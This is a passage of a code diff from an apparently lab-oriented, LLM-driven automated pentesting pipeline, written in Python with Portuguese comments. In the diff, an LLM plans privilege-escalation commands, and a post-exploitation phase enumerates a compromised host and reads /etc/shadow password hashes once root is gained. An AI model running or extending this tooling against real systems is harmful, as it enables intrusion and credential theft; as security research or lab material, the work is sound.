-                print(f"{C_RED}[PRIVESC] JSON invalido do LLM.{C_RESET}")
-                break
-            print(f"{C_BLUE}[PRIVESC] {plan.get('reason', '(sem motivo)')}{C_RESET}")
-            check = (plan.get("success_check") or "uid=0").strip()
-            cmds = plan.get("commands") or []
-            if plan.get("done") and not cmds:
+            if errs:
+                print(f"{C_YELLOW}[PRIVESC] schema: {'; '.join(errs)}{C_RESET}")
+            print(f"{C_BLUE}[PRIVESC] {plan['reason'] or '(sem motivo)'}{C_RESET}")
+            check = plan["success_check"]
+            cmds = plan["commands"]
+            if plan["done"] and not cmds:
                 break
             for cmd in cmds:
                 print(f"{C_YELLOW}[PRIVESC] $ {cmd}{C_RESET}")
@@ -1227,15 +1479,54 @@ If the history already shows uid=0(root), set done=true.
         return False
 
     def phase_4_post_exploitation(self):
-        print(f"\n>>> [FASE 4] POST-EXPLORACAO")
+        """FASE 4: LOOT automatico (item 6). Coleta DETERMINISTICA e read-only de
+        contexto do alvo via a sessao MSF (sem LLM): identidade, OS, sudo, SUID,
+        rede, cron e — se ja for root — hashes de /etc/shadow. Fica no evidence,
+        no relatorio e num artefato loot_<ip>_<ts>.txt. Comandos sempre no ALVO."""
+        print(f"\n>>> [FASE 4] POST-EXPLORACAO (LOOT automatico)")
+        loot = {}
+        # mapa rotulo -> comando (bounded, read-only; escopo = o host ja comprometido)
+        probes = [
+            ("id", "id; whoami 2>/dev/null; hostname"),
+            ("os", "uname -a; cat /etc/os-release 2>/dev/null | head -5"),
+            ("sudo", "sudo -n -l 2>/dev/null"),
+            ("suid", "find / -perm -4000 -type f 2>/dev/null | head -40"),
+            ("users", "cat /etc/passwd 2>/dev/null | head -40; ls -la /home 2>/dev/null"),
+            ("network", "(ip -o a 2>/dev/null || ifconfig -a 2>/dev/null); "
+                        "(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | head -30"),
+            ("cron", "ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null"),
+        ]
         try:
-            data = self.session_exec("id; hostname")
-            print(f"{C_GREEN}{data}{C_RESET}")
-            self.evidence["shell_info"] = str(data)
+            for key, cmd in probes:
+                out = (self.session_exec(cmd) or "").strip()
+                if out:
+                    loot[key] = out[:2000]
+                    print(f"{C_CYAN}--- {key} ---\n{out[:600]}{C_RESET}")
+            id_out = loot.get("id", "")
+            self.evidence["shell_info"] = id_out or self.evidence.get("shell_info", "")
+            # Hashes so quando JA e root (nao escala aqui; privesc e a FASE 5).
+            if "uid=0(root)" in id_out:
+                sh = (self.session_exec("cat /etc/shadow 2>/dev/null | head -40") or "").strip()
+                if sh and ":" in sh:
+                    loot["hashes"] = sh[:2000]
+                    print(f"{C_GREEN}[LOOT] /etc/shadow capturado (uid=0).{C_RESET}")
+            self.evidence["loot"] = loot
 
-            with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
-                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {data}")
-        except: pass
+            now = datetime.datetime.now()
+            safe_ip = self.target_ip.replace(".", "_")
+            fp = os.path.join(LOOT_DIR, f"loot_{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt")
+            with open(fp, "w", encoding="utf-8") as f:
+                f.write("LOOT POS-EXPLORACAO\nALVO: %s\nSESSAO: %s\nDATA: %s\n%s\n"
+                        % (self.target_ip, self.session_id, now, "=" * 50))
+                for key, _cmd in probes + [("hashes", "")]:
+                    if loot.get(key):
+                        f.write("\n--- %s ---\n%s\n" % (key.upper(), loot[key]))
+            print(f"{C_GREEN}[LOOT] artefato salvo: {fp}{C_RESET}")
+            # mantem o pwned.txt legado p/ compatibilidade
+            with open(f"{LOOT_DIR}/pwned.txt", "w", encoding="utf-8") as f:
+                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {id_out}")
+        except Exception as e:
+            print(f"{C_RED}[LOOT] falha parcial na coleta: {e}{C_RESET}")
 
 def get_best_route_ip(target_ip):
     """Descobre o IP de LHOST correto simulando uma rota ate o alvo."""
@@ -1254,6 +1545,8 @@ if __name__ == "__main__":
     parser.add_argument("--disable-rag", action="store_true", help="Desativa o RAG (ChromaDB): roda o modelo isoladamente (baseline).")
     parser.add_argument("--port", type=int, default=None, help="Restringe a analise a UMA porta (ex: 139), para A/B RAG on/off.")
     parser.add_argument("--no-brute", action="store_true", help="Remove a estrategia brute_force: forca o modelo a usar so exploits.")
+    parser.add_argument("--resume", action="store_true", help="Retoma uma run interrompida deste alvo (pula recon e portas ja resolvidas).")
+    parser.add_argument("--explain", action="store_true", help="Modo didatico: imprime a narrativa (porque de cada decisao) alem de salva-la em .md.")
     args = parser.parse_args()
 
     target = resolve_target(args.target)
@@ -1261,7 +1554,9 @@ if __name__ == "__main__":
     # nao o orquestrador: o reverse shell do alvo volta para o MSF host.
     lhost = os.getenv("MSF_RPC_HOST", "192.168.70.20")
 
-    p = PentestPipeline(target_ip=target, attacker_ip=lhost, use_rag=not args.disable_rag, only_port=args.port, allow_brute=not args.no_brute)
+    p = PentestPipeline(target_ip=target, attacker_ip=lhost, use_rag=not args.disable_rag,
+                        only_port=args.port, allow_brute=not args.no_brute,
+                        resume=args.resume, explain=args.explain)
     try:
         p.run()
         if p.session_id:
